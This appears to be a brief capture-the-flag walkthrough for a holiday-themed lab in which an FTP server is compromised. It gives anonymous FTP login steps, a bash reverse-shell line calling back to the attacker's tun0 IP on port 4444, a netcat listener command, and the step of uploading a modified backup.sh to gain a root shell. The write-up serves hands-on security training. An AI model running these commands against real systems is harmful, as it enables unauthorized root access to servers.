#Day-9
....................................................................
====================================================================
Day 9: Anyone can be Santa - Prelude:

﻿Even Santa has been having to adopt the "work from home" ethic in 2020. To help Santa out, Elf McSkidy and their team created a file server for The Best Festival Company (TBFC) that uses the FTP protocol. However, an attacker was able to hack this new server. Your mission, should you choose to accept it, is to understand how this hack occurred and to retrace the steps of the attacker.
====================================================================
....................................................................

how to get in to FTP:
#ftp ip_addrs_victim
name: anonymous

get to download the files from ftp server and put to download files from ftp server.

download the files from ftp server and put our malicious code in backup.sh
#bash -i >& /dev/tcp/Your_tun0_IP/4444 0>&1

then run the netcat listner:
#nc -lnvp 4444

use the put command to upload that modified .sh file on ftp server.


#You have the full root shell !!

